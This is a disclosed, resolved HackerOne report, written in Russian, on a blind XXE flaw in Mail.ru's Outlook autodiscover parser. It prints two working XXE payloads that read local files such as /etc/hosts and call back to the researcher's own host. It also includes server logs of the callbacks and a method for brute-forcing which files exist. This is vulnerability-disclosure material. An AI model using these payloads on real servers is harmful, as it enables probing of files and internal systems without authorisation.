---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '315837'
original_report_id: '315837'
title: blind XXE in autodiscover parser
weakness: XML External Entities (XXE)
team_handle: mailru
created_at: '2018-02-14T01:31:29.786Z'
disclosed_at: '2018-04-03T11:30:15.084Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 70
asset_identifier: e.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- xml-external-entities-xxe
---

# blind XXE in autodiscover parser

## Metadata

- HackerOne Report ID: 315837
- Weakness: XML External Entities (XXE)
- Program: mailru
- Disclosed At: 2018-04-03T11:30:15.084Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Как воспроизвести:

1) Закинуть на сервер атакующего xml (должен быть доступен на сервере атакующего по адресу /autodiscover/autodiscover.xml):
Я сделал такой ответ при запросе любой xml'ки: obmhld.com/autodiscover/autodiscover.xml
 
```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY localfile SYSTEM "file:///sys/power/image_size">
        <!ENTITY remotedoc SYSTEM "http://obmhld.com/pocs/?token=xmlsdfgdg5454g54&doc1=2">
]>
<foo>&localfile;&remotedoc;</foo>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006">
  <Response xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Account>
      <AccountType>email</AccountType>
      <Action>settings</Action>
      <Protocol>
        <Type>SMTP</Type>
        <Server>52.34.103.214</Server>
        <Port>1191</Port>
        <DomainRequired>off</DomainRequired>
        <LoginName>account@obmhld.com</LoginName>
        <DomainName>yandex.ru</DomainName>
        <SPA>off</SPA>
        <SSL>off</SSL>
        <AuthRequired>off</AuthRequired>
      </Protocol>
    </Account>
  </Response>
</Autodiscover>
```

2) Зайти на главную https://mail.ru  и авторизоваться с логином в формате 

```
<any_login>@<atatcker_server> (в моем случае было asdasdhkjh345@obmhd.com )
```

После этого с сервера **5.61.237.44** прилетает запрос на мой сервер. Это можно увидеть в логах:

```
5.61.237.44 - - [14/Feb/2018:01:05:14 +0000] "GET /autodiscover/autodiscover.xml HTTP/1.0" 200 955 "http://obmhld.com/autodiscover/autodiscover.xml" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/6.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Tablet PC 2.0; Microsoft Outlook 15.0.4481; ms-office; MSOffice 15)"
```

Следом прилетают другие запросы:

```
5.61.237.44 - - [14/Feb/2018:01:05:15 +0000] "GET /pocs/?token=xmlsdfgdg5454g54&doc1=2 HTTP/1.0" 200 10 "-" "-"
```

Это в свою очередь означает, что внешние сущности включены и документ успешно парсится.

P.S. Послезавтра еще покопаю, если ошибка еще будет открыта, может еще какой-нибудь импакт есть.

## Impact

Импакт:

 1) Можно брутфорсить локальные файлы и директории на сервере:

Например с такой xml'кой:

```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY file SYSTEM "file:///etc/hosts">
<!ENTITY doc2 SYSTEM "http://obmhld.com/pocs/?token=xmlsdfgdg5454g54&doc2=2;">
]>
<r>&file;&doc2;</r>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006">
  <Response xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Account>
      <AccountType>email</AccountType>
      <Action>redirectUrl</Action>
      <RedirectUrl>https://auto.obmhld.com/autodiscover/autodiscover.xml</RedirectUrl>
    </Account>
  </Response>
</Autodiscover>
```

Если файл или директория (сущность file) существует - парсер сделает http запрос на obmhld.com. Если же файла нет, то парсинг останавливается и запроса нет.

 2) Также потенциально тут может быть SSRF (скорее всего есть, но я не проверял)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
